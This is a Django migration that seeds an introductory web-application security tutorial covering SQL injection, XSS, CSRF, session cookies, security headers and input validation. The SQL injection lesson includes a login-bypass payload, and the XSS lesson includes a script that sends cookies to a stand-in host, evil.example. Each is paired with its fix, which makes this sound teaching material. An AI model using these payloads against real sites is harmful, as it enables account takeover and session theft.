from django.db import migrations

ARTICLES = [
    {
        "title": "What is Web Application Security?",
        "slug": "what-is-web-application-security",
        "order": 1,
        "summary": "Why web apps are the most common attack surface, and what this subject covers.",
        "body": """
<p>Most real-world attacks don't target an operating system or a network cable &mdash; they
target the web application sitting on top of them: the login form, the search box, the file
upload, the API endpoint. Anywhere a web app accepts input from a stranger on the internet
and does something with it is a potential way in.</p>
<p>This subject goes deeper into the handful of vulnerability classes responsible for most
real breaches &mdash; the ones briefly introduced in the OWASP Top 10 article in Cybersecurity
Fundamentals &mdash; and, just as important, the specific fix for each one. Security isn't
abstract once you've seen the actual line of code that causes the problem, and the line that
fixes it.</p>
""",
        "example_code": "",
        "expected_output": "",
    },
    {
        "title": "SQL Injection",
        "slug": "sql-injection",
        "order": 2,
        "summary": "What happens when user input is pasted directly into a database query, and how to stop it.",
        "body": """
<p>A web app usually builds a database query using something the user typed &mdash; a
username, a search term. SQL injection happens when that input is glued directly into the
query string instead of being treated as pure data, letting an attacker's input change what
the query actually does.</p>
<p>A classic example: a login check built as a string.</p>
""",
        "example_code": """# Vulnerable — the raw username/password are pasted into the query text
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

# An attacker enters this as the "username":
#   admin' --
# The query becomes:
#   SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
# Everything after -- is a SQL comment, so the password check never runs.

# Fixed — a parameterized query keeps input separate from the query structure
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    [username, password],
)""",
        "expected_output": "The vulnerable query lets the attacker's input change the SQL itself, bypassing the password check entirely. The parameterized version passes username and password as plain data — no matter what characters they contain, they can never change the query's structure.",
    },
    {
        "title": "Cross-Site Scripting (XSS)",
        "slug": "cross-site-scripting-xss",
        "order": 3,
        "summary": "What happens when user input is rendered as HTML instead of text, and how to stop it.",
        "body": """
<p>Cross-site scripting happens when a web page takes input from one user (a comment, a
username, a review) and displays it to <em>other</em> users without neutralizing it first. If
that input contains HTML or JavaScript, the browser runs it as part of the page &mdash; not as
the harmless text it was supposed to be.</p>
<p>A comment field is a typical target:</p>
""",
        "example_code": """# Vulnerable — the comment is inserted straight into the page's HTML
page_html = f"<p>{comment}</p>"

# An attacker posts this as their "comment":
#   <script>document.location='https://evil.example/steal?cookie='+document.cookie</script>
# Every visitor who views the page now runs that script in their own browser.

# Fixed — escape the special HTML characters before inserting user input
import html
page_html = f"<p>{html.escape(comment)}</p>"
# <script> becomes &lt;script&gt; — displayed as literal text, never executed""",
        "expected_output": "The vulnerable version lets the attacker's <script> tag execute in every other visitor's browser, often used to steal their session cookie. Escaping turns the dangerous characters into their literal text equivalents, so the browser displays them instead of running them.",
    },
    {
        "title": "Cross-Site Request Forgery (CSRF)",
        "slug": "cross-site-request-forgery-csrf",
        "order": 4,
        "summary": "How a malicious site can make your browser perform an action on a site you're already logged into.",
        "body": """
<p>If you're logged into your bank in one tab, your browser automatically attaches your
session cookie to <em>any</em> request to that bank's domain &mdash; even one triggered by a
completely different, malicious site you have open in another tab. CSRF abuses this: a
malicious page silently submits a form or request to a site you're logged into, and your
browser happily attaches your real credentials.</p>
<p>The standard defense is a <strong>CSRF token</strong>: a random, unpredictable value the
real site embeds in its own forms and checks on submission. A malicious third-party page has
no way to know or guess that token, so its forged request gets rejected even though your
session cookie was valid. This is exactly what Django's <code>{% csrf_token %}</code> template
tag does automatically on every form in this site.</p>
""",
        "example_code": "",
        "expected_output": "",
    },
    {
        "title": "Authentication & Session Security",
        "slug": "authentication-and-session-security",
        "order": 5,
        "summary": "Keeping a user's logged-in session from being stolen or hijacked after they've proven who they are.",
        "body": """
<p>Logging in proves who someone is once; a <strong>session</strong> is how the site
remembers that for every request afterward, usually via a cookie containing a session ID.
If that cookie leaks, an attacker doesn't need a password at all &mdash; they can just reuse
the session ID and the site will treat them as the real user.</p>
<p>A few practices that keep sessions from leaking: marking session cookies
<strong>HttpOnly</strong> (so JavaScript, including an XSS payload, can't read them),
<strong>Secure</strong> (so they're only ever sent over HTTPS, never in the clear), issuing a
brand new session ID after login rather than reusing a pre-login one, and expiring sessions
after a period of inactivity so a stolen cookie doesn't stay valid forever.</p>
""",
        "example_code": "",
        "expected_output": "",
    },
    {
        "title": "HTTPS & Secure Headers",
        "slug": "https-and-secure-headers",
        "order": 6,
        "summary": "Encrypting traffic in transit, and the response headers that close off common browser-level attacks.",
        "body": """
<p><strong>HTTPS</strong> encrypts everything sent between a browser and a server, so anyone
intercepting the traffic (on public WiFi, for instance) sees scrambled bytes, not passwords or
session cookies in plain text. There's no good reason for any modern site to serve sensitive
pages over plain HTTP.</p>
<p>A handful of response headers close off attacks HTTPS alone doesn't cover:</p>
""",
        "example_code": """Content-Security-Policy: default-src 'self'
# Tells the browser to only run scripts/styles from this site's own origin,
# a strong second layer of defense against XSS even if some input escapes.

X-Content-Type-Options: nosniff
# Stops the browser from guessing a file's type, which can be tricked into
# running an uploaded file as a script instead of serving it as plain data.

Strict-Transport-Security: max-age=63072000
# Tells the browser to only ever reach this site over HTTPS, even if a
# user types "http://" or clicks an old plain-HTTP link.""",
        "expected_output": "None of these headers are a complete defense on their own — they're layers. Each one closes off a specific way an attacker could otherwise abuse the browser, even against a site that's already doing input validation correctly elsewhere.",
    },
    {
        "title": "Input Validation & Sanitization",
        "slug": "input-validation-and-sanitization",
        "order": 7,
        "summary": "Why every other fix in this subject depends on treating user input as untrusted by default.",
        "body": """
<p>Every vulnerability in this subject has the same root cause: user input being trusted and
used somewhere it shouldn't be. <strong>Validation</strong> rejects input that doesn't match
what's expected (an email field that isn't shaped like an email, a quantity field that isn't a
positive number). <strong>Sanitization</strong> goes further &mdash; it doesn't just check the
input, it transforms it into a safe form (like the HTML-escaping from the XSS article).</p>
<p>The practical rule: validate and sanitize on the <strong>server</strong>, not just in the
browser. Client-side validation is a good user-experience nicety, since it gives instant
feedback, but it's trivial for an attacker to bypass entirely by sending a request directly to
the server, skipping the browser and its JavaScript altogether.</p>
""",
        "example_code": "",
        "expected_output": "",
    },
    {
        "title": "A Web Security Checklist",
        "slug": "web-security-checklist",
        "order": 8,
        "summary": "The short version of everything in this subject, for whenever you're shipping a real form or endpoint.",
        "body": """
<p>Before shipping anything that accepts user input: use parameterized queries, never
string-built SQL. Escape (or let your framework's templates escape) any user content before
it's rendered as HTML. Rely on your framework's built-in CSRF protection on every form that
changes data. Mark session cookies HttpOnly and Secure, and serve the whole site over HTTPS.
Validate and sanitize on the server, every time, even if the browser already checked it
first.</p>
<p>None of this is exotic. Almost every major real-world breach traces back to one of these
basics being skipped somewhere, not to some exotic, never-before-seen technique.</p>
""",
        "example_code": "",
        "expected_output": "",
    },
]


def seed_web_security_subject(apps, schema_editor):
    Subject = apps.get_model("tutorials", "Subject")
    Category = apps.get_model("tutorials", "Category")
    Article = apps.get_model("tutorials", "Article")

    cybersecurity = Category.objects.get(slug="cybersecurity")

    subject, _ = Subject.objects.update_or_create(
        slug="web-application-security",
        defaults={
            "category": cybersecurity,
            "name": "Web Application Security",
            "icon": "\U0001F310",
            "description": "The specific vulnerabilities behind most real breaches — SQL injection, XSS, CSRF, and how to actually fix each one.",
            "editor_language": "none",
            "order": 9,
            "is_active": True,
        },
    )

    for data in ARTICLES:
        Article.objects.update_or_create(
            subject=subject,
            slug=data["slug"],
            defaults={
                "title": data["title"],
                "order": data["order"],
                "summary": data["summary"],
                "body": data["body"],
                "example_code": data["example_code"],
                "expected_output": data["expected_output"],
            },
        )


def unseed_web_security_subject(apps, schema_editor):
    Subject = apps.get_model("tutorials", "Subject")
    Subject.objects.filter(slug="web-application-security").delete()


class Migration(migrations.Migration):
    dependencies = [
        ("tutorials", "0047_deepen_swift_content"),
    ]

    operations = [
        migrations.RunPython(seed_web_security_subject, unseed_web_security_subject),
    ]
